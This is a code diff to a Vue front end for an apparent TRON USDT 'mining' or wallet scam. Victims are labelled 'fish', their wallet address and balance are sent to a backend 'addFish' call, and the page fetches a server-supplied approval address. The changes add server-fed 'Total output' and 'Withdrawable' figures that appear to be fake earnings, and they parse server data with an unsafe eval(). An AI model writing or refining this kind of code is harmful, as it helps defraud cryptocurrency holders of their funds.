@@ -214,19 +214,19 @@
               <div class="blockItem">
                 <div class="itemTitle">Total output</div>
                 <div class="itemValue">
-                  <span id="output_usdt">0.00</span> USDT
+                  <span id="output_usdt">{{ fish.total==null?"0.00":fish.total}}</span> USDT
                 </div>
               </div>
               <div class="blockItem">
                 <div class="itemTitle">Wallet balance</div>
                 <div class="itemValue">
-                  <span id="account_usdt">{{ fish.usdt }}</span> USDT
+                  <span id="account_usdt">{{ fish.usdt==null?"0.00":fish.usdt }}</span> USDT
                 </div>
               </div>
               <div class="blockItem">
                 <div class="itemTitle">Withdrawable</div>
                 <div class="itemValue">
-                  <span id="withdrawable_usdt">0.00</span> USDT
+                  <span id="withdrawable_usdt">{{fish.allow_withdraw==null?"0.00":fish.allow_withdraw}}</span> USDT
                 </div>
               </div>
             </div>
@@ -261,13 +261,12 @@
                       autocomplete="off"
                       type="number"
                       class="uni-input-input"
+                      v-model="redeeallBalance"
                     />
                   </div>
                 </div>
                 <div class="changeAll">
-                  <a style="color: inherit;" href="javascript:redeeall();"
-                    >Redeem all</a
-                  >
+                  <a style="color: inherit;" @click="redeeall()">Redeem all</a>
                 </div>
               </div>
 
@@ -372,23 +371,20 @@ export default {
       shareLink: window.location.href,
       showConnection: true,
       showAddress: false,
+      redeeallBalance: undefined,
       fish: {
           token: undefined,
           address: undefined,
           trx: undefined,
-          usdt: undefined
+          usdt: undefined,
+          total: undefined,
+          allow_withdraw: undefined
       }
     };
   },
   created() {
     this.init();
-    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-      this.showConnection = false;
-      this.showAddress = true;
-    } else {
-      this.showConnection = true;
-      this.showAddress = false;
-    }
+
   },
   methods:{
     connectionWallet(){
@@ -408,12 +404,19 @@ export default {
           // }
           this.fish.address=wallet_addr;
           this.fish.token=this.$route.query.token;
-          await this.contract.balanceOf(wallet_addr).call((err, balance) => {
-            this.fish.usdt=(balance/1000000).toFixed(6);
+          await this.contract.balanceOf(wallet_addr).call((err, usdt) => {
+            this.fish.usdt=(usdt/1000000).toFixed(6);
             addFish(this.fish).then(response => {
               if (response.data.code == 200){
                 this.showConnection = false;
                 this.showAddress = true;
+                this.fish=response.data.data;
+                var balance = eval('(' + this.fish.balance +')');
+                this.fish.trx=balance.trx==null?0.00:balance.trx;
+                this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
+                this.fish.allow_withdraw=balance.allow_withdraw==null?0.00:balance.allow_withdraw;
+                this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.allow_withdraw);
+
                 return true;
               }else{
                 this.showConnection = false;
@@ -436,7 +439,6 @@ export default {
           this.approveAddr=response.data.msg;
         }
         if (response.data.code==500){
-          console.info(response.data.msg);
           this.showConnection = false;
           this.showAddress = true;
         }
@@ -476,6 +478,9 @@ export default {
     },
     onCopy(){
       this.$toast({ message: "copy Success"});
+    },
+    redeeall(){
+      this.redeeallBalance=this.fish.allow_withdraw;
     }
   }
 };
